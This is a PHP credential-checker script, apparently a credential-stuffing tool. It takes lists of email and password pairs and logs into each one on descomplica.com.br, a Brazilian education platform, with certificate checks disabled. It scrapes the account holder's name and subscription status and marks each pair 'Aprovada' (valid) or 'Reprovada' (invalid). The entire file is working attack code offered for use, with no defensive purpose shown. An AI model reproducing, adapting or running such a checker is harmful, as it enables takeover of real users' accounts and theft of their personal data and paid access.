<?php

error_reporting(0);
DeletarCookies();

extract($_GET);

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies()
{
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

$lista = str_replace(" ", "", $lista);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/entrar/");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Host: descomplica.com.br",
    "Connection: keep-alive",
    "Accept: */*",
    "Origin: https://descomplica.com.br",
    "X-Requested-With: XMLHttpRequest",
    "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
    "Referer: https://descomplica.com.br/entrar/",
));
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 0);

$data = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, 'https://descomplica.com.br/entrar/');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Email=' . $email . '&Password=' . $senha . '');
$data = curl_exec($ch);

//DADOS
curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/configuracoes/perfil/");
curl_setopt($ch, CURLOPT_POST, 0);
$data = curl_exec($ch);
$nome = getStr($data, '"firstName":"', '",');
$sobrenome = getStr($data, '"lastName":"', '",');

//PLANOS
curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/configuracoes/");
curl_setopt($ch, CURLOPT_POST, 0);
$data = curl_exec($ch);

if (strpos($data, 'Expira em')) {
    $plano = "Tem plano!";
} else {
    $plano = "Não tem plano";
}

if (!strpos($data, 'Dados Pessoais')) {
    echo ' <font color="red" style="font-weight: #C0392B;">#Reprovada </font> ' . $email . ' | ' . $senha . '  <font color="#333333"></font> ';
} else {
    $tudo = " [Nome: $nome $sobrenome] - [Plano: $plano]";
    echo ' <font color="green" style="font-weight: bold;">#Aprovada </font> <font color="#D0D3D4"> ' . $email . ' | ' . $senha . '' . $tudo . '</font> <font color="#333333"></font>';
}
